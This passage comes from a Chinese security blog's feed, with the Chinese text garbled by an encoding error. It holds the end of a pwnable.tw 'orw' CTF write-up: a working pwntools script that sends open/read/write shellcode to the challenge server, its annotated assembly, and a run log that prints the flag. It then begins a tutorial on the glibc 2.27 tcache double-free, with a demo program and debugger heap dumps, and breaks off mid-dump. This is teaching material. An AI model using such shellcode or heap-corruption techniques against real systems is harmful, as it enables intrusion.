å…¥raxï¼Œå„ä¸ªå‚æ•°æŒ‰ç…§rdiã€rsiã€rdxçš„é¡ºåºä¼ é€’åˆ°å¯„å­˜å™¨ä¸­ï¼Œç³»ç»Ÿè°ƒç”¨è¿”å›å€¼å‚¨å­˜åˆ°raxå¯„å­˜å™¨ã€‚<br>ç”±äºè¿™é“é¢˜æ˜¯32ä½ç¨‹åºï¼Œå› æ­¤ç¼–å†™shellcodeå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import *<br>context.log_level=<span class="hljs-string">"debug"</span><br>p = remote(<span class="hljs-string">'chall.pwnable.tw'</span>, <span class="hljs-number">10001</span>)<br><br>shellcode_open = <span class="hljs-string">'xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;'</span><br>shellcode_read = <span class="hljs-string">'mov ebx,eax;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x3;int 0x80;'</span><br>shellcode_write = <span class="hljs-string">'mov ebx,0x1;mov ecx,0x0804A260;mov edx,0x40;mov eax,0x4;int 0x80;'</span><br>shellcode = shellcode_open + shellcode_read + shellcode_write<br>shellcode = <span class="hljs-keyword">asm</span>(shellcode)<br>p.recvuntil(<span class="hljs-string">':'</span>)<br>p.sendline(shellcode)<br>print p.recv()<br>p.interactive()<br><br><span class="hljs-string">'''</span><br>shellcodeè¯´æ˜ï¼š                   <br>xor eax,eax      ;æ¸…ç©ºéœ€è¦ç”¨åˆ°çš„å¯„å­˜å™¨<br>xor ebx,ebx<br>xor ecx,ecx<br>xor edx,edx<br><br><span class="hljs-meta">#fd = open(<span class="hljs-string">'/home/orw/flag'</span>,0)</span><br>push <span class="hljs-number">0x00006761</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>çš„åå…­è¿›åˆ¶<br>push <span class="hljs-number">0x6c662f77</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>çš„åå…­è¿›åˆ¶<br>push <span class="hljs-number">0x726f2f65</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>çš„åå…­è¿›åˆ¶<br>push <span class="hljs-number">0x6d6f682f</span>;           ;<span class="hljs-string">"/home/orw/flag"</span>çš„åå…­è¿›åˆ¶<br>mov ebx, esp;              ;<span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *filename<br>mov eax, <span class="hljs-number">0x5</span>;              ;openå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨ï¼šsys_open<br><span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br><br><br><span class="hljs-meta">#read(fd,bss+0x200,0x40)</span><br>mov ebx, eax;              ;<span class="hljs-type">int</span> fd<br>mov ecx, <span class="hljs-number">0x0804A260</span>;       ;<span class="hljs-type">void</span> *buf<br>mov edx, <span class="hljs-number">0x40</span>;             ;<span class="hljs-type">size_t</span> count<br>mov eax, <span class="hljs-number">0x3</span>;              ;readå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨ï¼šsys_read<br><span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br><br><span class="hljs-meta">#write(1,bss+0x200,0x40)</span><br>mov ebx, <span class="hljs-number">0x1</span>;              ;<span class="hljs-type">int</span> fd=<span class="hljs-number">1</span> (æ ‡å‡†è¾“å‡º<span class="hljs-built_in">stdout</span>)(<span class="hljs-number">0</span> æ ‡å‡†è¾“å…¥ï¼Œ<span class="hljs-number">1</span> æ ‡å‡†è¾“å‡ºï¼Œ<span class="hljs-number">2</span> æ ‡å‡†é”™è¯¯è¾“å‡º)<br>mov ecx, <span class="hljs-number">0x0804A260</span>;       ;<span class="hljs-type">void</span> *buf<br>mov edx, <span class="hljs-number">0x40</span>;             ;<span class="hljs-type">size_t</span> count<br>mov eax, <span class="hljs-number">0x4</span>;              ;readå‡½æ•°çš„ç³»ç»Ÿè°ƒç”¨ï¼šsys_read<br><span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br><span class="hljs-string">'''</span><br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c">âœ  others python orw_exp.py <br>[+] Opening connection to chall.pwnable.tw on port <span class="hljs-number">10001</span>: Done<br>[DEBUG] cpp -C -nostdinc -undef -P -I/home/ubuntu/.local/lib/python2<span class="hljs-number">.7</span>/site-packages/pwnlib/data/includes /dev/<span class="hljs-built_in">stdin</span><br>[DEBUG] Assembling<br>    .section .shellcode,<span class="hljs-string">"awx"</span><br>    .global _start<br>    .global __start<br>    _start:<br>    __start:<br>    .intel_syntax noprefix<br>    xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push <span class="hljs-number">0x00006761</span>;push <span class="hljs-number">0x6c662f77</span>;push <span class="hljs-number">0x726f2f65</span>;push <span class="hljs-number">0x6d6f682f</span>;mov ebx,esp;mov eax,<span class="hljs-number">0x5</span>;<span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;mov ebx,eax;mov ecx,<span class="hljs-number">0x0804A260</span>;mov edx,<span class="hljs-number">0x40</span>;mov eax,<span class="hljs-number">0x3</span>;<span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;mov ebx,<span class="hljs-number">0x1</span>;mov ecx,<span class="hljs-number">0x0804A260</span>;mov edx,<span class="hljs-number">0x40</span>;mov eax,<span class="hljs-number">0x4</span>;<span class="hljs-type">int</span> <span class="hljs-number">0x80</span>;<br>[DEBUG] /usr/bin/x86_64-linux-gnu-as <span class="hljs-number">-32</span> -o /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step2 /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step1<br>[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step3 /tmp/pwn-<span class="hljs-keyword">asm</span><span class="hljs-number">-7b</span>YAEr/step4<br>[DEBUG] Received <span class="hljs-number">0x17</span> bytes:<br>    <span class="hljs-string">'Give my your shellcode:'</span><br>[DEBUG] Sent <span class="hljs-number">0x4f</span> bytes:<br>    <span class="hljs-number">00000000</span>  <span class="hljs-number">31</span> c0 <span class="hljs-number">31</span> db  <span class="hljs-number">31</span> c9 <span class="hljs-number">31</span> d2  <span class="hljs-number">68</span> <span class="hljs-number">61</span> <span class="hljs-number">67</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">68</span> <span class="hljs-number">77</span> <span class="hljs-number">2f</span>  â”‚<span class="hljs-number">1</span>Â·<span class="hljs-number">1</span>Â·â”‚<span class="hljs-number">1</span>Â·<span class="hljs-number">1</span>Â·â”‚hagÂ·â”‚Â·hw/â”‚<br>    <span class="hljs-number">00000010</span>  <span class="hljs-number">66</span> <span class="hljs-number">6</span>c <span class="hljs-number">68</span> <span class="hljs-number">65</span>  <span class="hljs-number">2f</span> <span class="hljs-number">6f</span> <span class="hljs-number">72</span> <span class="hljs-number">68</span>  <span class="hljs-number">2f</span> <span class="hljs-number">68</span> <span class="hljs-number">6f</span> <span class="hljs-number">6</span>d  <span class="hljs-number">89</span> e3 b8 <span class="hljs-number">05</span>  â”‚flheâ”‚/orhâ”‚/homâ”‚Â·Â·Â·Â·â”‚<br>    <span class="hljs-number">00000020</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> cd  <span class="hljs-number">80</span> <span class="hljs-number">89</span> c3 b9  <span class="hljs-number">60</span> a2 <span class="hljs-number">04</span> <span class="hljs-number">08</span>  ba <span class="hljs-number">40</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚`Â·Â·Â·â”‚Â·@Â·Â·â”‚<br>    <span class="hljs-number">00000030</span>  <span class="hljs-number">00</span> b8 <span class="hljs-number">03</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> cd <span class="hljs-number">80</span>  bb <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> b9 <span class="hljs-number">60</span> a2  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·`Â·â”‚<br>    <span class="hljs-number">00000040</span>  <span class="hljs-number">04</span> <span class="hljs-number">08</span> ba <span class="hljs-number">40</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> b8  <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  cd <span class="hljs-number">80</span> <span class="hljs-number">0</span>a     â”‚Â·Â·Â·@â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·â”‚<br>    <span class="hljs-number">0000004f</span><br>[DEBUG] Received <span class="hljs-number">0x40</span> bytes:<br>    <span class="hljs-number">00000000</span>  <span class="hljs-number">46</span> <span class="hljs-number">4</span>c <span class="hljs-number">41</span> <span class="hljs-number">47</span>  <span class="hljs-number">7b</span> <span class="hljs-number">73</span> <span class="hljs-number">68</span> <span class="hljs-number">33</span>  <span class="hljs-number">6</span>c <span class="hljs-number">6</span>c <span class="hljs-number">63</span> <span class="hljs-number">30</span>  <span class="hljs-number">64</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e <span class="hljs-number">67</span>  â”‚FLAGâ”‚{sh3â”‚llc0â”‚dingâ”‚<br>    <span class="hljs-number">00000010</span>  <span class="hljs-number">5f</span> <span class="hljs-number">77</span> <span class="hljs-number">31</span> <span class="hljs-number">74</span>  <span class="hljs-number">68</span> <span class="hljs-number">5f</span> <span class="hljs-number">6f</span> <span class="hljs-number">70</span>  <span class="hljs-number">33</span> <span class="hljs-number">6</span>e <span class="hljs-number">5f</span> <span class="hljs-number">72</span>  <span class="hljs-number">33</span> <span class="hljs-number">34</span> <span class="hljs-number">64</span> <span class="hljs-number">5f</span>  â”‚_w1tâ”‚h_opâ”‚<span class="hljs-number">3</span>n_râ”‚<span class="hljs-number">34</span>d_â”‚<br>    <span class="hljs-number">00000020</span>  <span class="hljs-number">77</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">74</span>  <span class="hljs-number">33</span> <span class="hljs-number">7</span>d <span class="hljs-number">0</span>a <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  â”‚writâ”‚<span class="hljs-number">3</span>}Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚<br>    <span class="hljs-number">00000030</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚<br>    <span class="hljs-number">00000040</span><br>FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}<br>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00<br>[*] Switching to interactive mode<br>[*] Got EOF <span class="hljs-keyword">while</span> reading in interactive<br>$ <br></code></pre></td></tr></tbody></table></figure><h2 id="prctlæ˜¯å¦èƒ½ç»•è¿‡ï¼Ÿ"><a href="#prctlæ˜¯å¦èƒ½ç»•è¿‡ï¼Ÿ" class="headerlink" title="prctlæ˜¯å¦èƒ½ç»•è¿‡ï¼Ÿ"></a>prctlæ˜¯å¦èƒ½ç»•è¿‡ï¼Ÿ</h2><p>å¯ä»¥ï¼Œä½†æ˜¯ä¸ä¼š</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åˆæ¢ï¼ˆLinux-Kernelï¼‰sandboxä¸­çš„prctl-seccompæœºåˆ¶ï¼ˆorwï¼‰&quot;&gt;&lt;a href=&quot;#åˆæ¢ï¼ˆLinux-Kernelï¼‰sandboxä¸­çš„prctl-seccompæœºåˆ¶ï¼ˆorwï¼‰&quot; class=&quot;headerlink&quot; title=&quot;åˆæ¢</summary>
      
    
    
    
    <category term="pwn è¿›é˜¶" scheme="https://kylinxin.github.io/categories/pwn-%E8%BF%9B%E9%98%B6/"/>
    
    
    <category term="orw" scheme="https://kylinxin.github.io/tags/orw/"/>
    
  </entry>
  
  <entry>
    <title>Tcache Attackä¸­çš„Tcache dupï¼ˆåŸºç¡€ï¼‰</title>
    <link href="https://kylinxin.github.io/2023/09/15/Tcache%20Attack%E7%9A%84Tcache%20dup/"/>
    <id>https://kylinxin.github.io/2023/09/15/Tcache%20Attack%E7%9A%84Tcache%20dup/</id>
    <published>2023-09-15T13:58:29.000Z</published>
    <updated>2023-09-14T14:03:05.922Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tcache-Attackä¸­çš„Tcache-dupï¼ˆåŸºç¡€ï¼‰"><a href="#Tcache-Attackä¸­çš„Tcache-dupï¼ˆåŸºç¡€ï¼‰" class="headerlink" title="Tcache Attackä¸­çš„Tcache dupï¼ˆåŸºç¡€ï¼‰"></a><strong>Tcache Attackä¸­çš„Tcache dupï¼ˆåŸºç¡€ï¼‰</strong></h1><blockquote><p>å‚è€ƒèµ„æ–™ï¼šCTF-wikiï¼š<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-dup">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-dup</a><br>ä»£ç æ±‰åŒ–ï¼š@yichenï¼š<a href="https://www.yuque.com/hxfqg9/bin/qlry85#g5z3g">https://www.yuque.com/hxfqg9/bin/qlry85#g5z3g</a><br>é™„ä»¶ï¼š<br>é“¾æ¥: <a href="https://pan.baidu.com/s/1X6PqMvKMTbeIlrv00FelAA">https://pan.baidu.com/s/1X6PqMvKMTbeIlrv00FelAA</a>  å¯†ç : u7pc<br>â€“æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜V3çš„åˆ†äº«</p></blockquote><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><blockquote><p>è¿™é‡Œä½¿ç”¨libc-2.27.soçš„æºç è¿›è¡Œåˆ†æ</p></blockquote><p>Tcache dupåˆ©ç”¨çš„æ˜¯tcache_put()å‡½æ•°çš„ä¸ä¸¥è°¨ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">#ä»£ç ç¬¬<span class="hljs-number">2923</span><span class="hljs-number">-2933</span>è¡Œï¼š<br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there's room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>{<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>}<br></code></pre></td></tr></tbody></table></figure><p>ä»ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡ºï¼Œåœ¨libc-2.27ç‰ˆæœ¬ä¸­æ²¡æœ‰å¯¹tcache_putå‡½æ•°è¿›è¡Œæ£€æŸ¥ï¼Œç”šè‡³æ²¡æœ‰å¯¹tcache-&gt;counts[tc_idx] çš„æ£€æŸ¥ï¼Œåœ¨å¤§å¹…åº¦æé«˜æ€§èƒ½çš„åŒæ—¶å®‰å…¨æ€§ä¹Ÿä¸‹é™æ¥è®¸å¤šã€‚<br>å› ä¸ºåœ¨è¿™ä¸ªå‡½æ•°ä¸­æ²¡æœ‰ä»»ä½•çš„æ£€æŸ¥ï¼Œ<strong>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥å¯¹åŒä¸€ä¸ªchunkè¿›è¡Œå¤šæ¬¡freeï¼Œé€ æˆcyclical listã€‚</strong></p><blockquote><p>Tcache dupç±»ä¼¼äºä¹‹å‰fastbin_attackä¸­çš„double freeï¼Œä½†æ˜¯åè€…çš„æ£€æŸ¥è¦æ›´å¤šã€‚</p></blockquote><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªdemoæ¥è¿›è¡Œè¯´æ˜ã€‚</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">//gcc -g -fno-stack-protector -z execstack -no-pie -z norelro test.c -o test</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>{<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"å…ˆç”³è¯·ä¸€å—å†…å­˜\n"</span>);<br>    <span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"ç”³è¯·çš„å†…å­˜åœ°å€æ˜¯: %p\n"</span>, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"å¯¹è¿™å—å†…å­˜åœ°å€ freeä¸¤æ¬¡\n"</span>);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"è¿™æ—¶å€™é“¾è¡¨æ˜¯è¿™æ ·çš„ [ %p, %p ].\n"</span>, a, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"æ¥ä¸‹æ¥å†å» malloc ä¸¤æ¬¡: [ %p, %p ].\n"</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>), <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"Finish!!!\n"</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>ç¼–è¯‘å®Œæˆä¹‹åï¼Œä½¿ç”¨pwndbgè°ƒè¯•ç¨‹åºï¼Œé¦–å…ˆå¯¹ä»£ç çš„ç¬¬12è¡Œä¸‹æ–­ç‚¹ï¼Œç„¶åå¼€å§‹è°ƒè¯•ç¨‹åºï¼Œæ­¤æ—¶çš„å†…å­˜çŠ¶å†µå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x601000</span><br>Size: <span class="hljs-number">0x251</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x601250</span><br>Size: <span class="hljs-number">0x21</span><br><br>Top chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x601270</span><br>Size: <span class="hljs-number">0x20d91</span><br><br>pwndbg&gt; x/<span class="hljs-number">100</span>gx <span class="hljs-number">0x601000</span><br><span class="hljs-number">0x601000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000251</span> #tcache_perthread_struct<br>......(çœç•¥å†…å®¹å‡ä¸ºç©º)<br><span class="hljs-number">0x601250</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #chunk1<br><span class="hljs-number">0x601260</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x601270</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020d91</span> #top_chunk<br>......(çœç•¥å†…å®¹å‡ä¸ºç©º)<br><span class="hljs-number">0x601310</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; bin<br>tcachebins<br>empty<br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin<br>all: <span class="hljs-number">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/<span class="hljs-number">16</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dcfc40</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfc50</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfc60</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfc70</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfc80</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfc90</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dcfca0</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000601270</span><span class="hljs-number">0x0000000000000000</span><br>    #æŒ‡å‘top_chunk<br><span class="hljs-number">0x7ffff7dcfcb0</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007ffff7dcfca0</span><span class="hljs-number">0x00007ffff7dcfca0</span><br>pwndbg&gt; <br><br></code></pre></td></tr></tbody></table></figure><p>ç”±äºåœ¨tcache_putå‡½æ•°ä¸­æ²¡æœ‰å¯¹å †å—è¿›è¡Œæ£€æŸ¥ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯¹mallocå‡ºçš„chunkè¿›è¡Œå¤šæ¬¡freeã€‚<br>å¯¹ä»£ç çš„ç¬¬15è¡Œä¸‹æ–­ç‚¹ï¼Œç»§ç»­è°ƒè¯•ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x601000</span><br>Size: <span class="hljs-number">0x251</span><br><br>Free <span class="hljs-title function_">chunk</span> <span class="hljs-params">(tcache)</span> | PREV_INUSE<br>Addr: 0x601250<br>Size: 0x21<br>fd: 0x601260<br><br>Top chunk | PREV_INUSE<br>Addr: 0x601270<br>Size: 0x20d91<br><br>pwndbg&gt; x/100gx 0x601000<br>0x601000:0x00000000000000000x0000000000000251 #tcache_perthread_struct<br>0x601010:0x00000000000000020x0000000000000000<br>    <span class="hljs-meta">#count=2</span><br>0x601020:0x00000000000000000x0000000000000000<br>0x601030:0x00000000000000000x0000000000000000<br>0x601040:0x00000000000000000x0000000000000000<br>0x601050:0x00000000006012600x0000000000000000<br>    #æŒ‡å‘chunk1_data<br>......<span 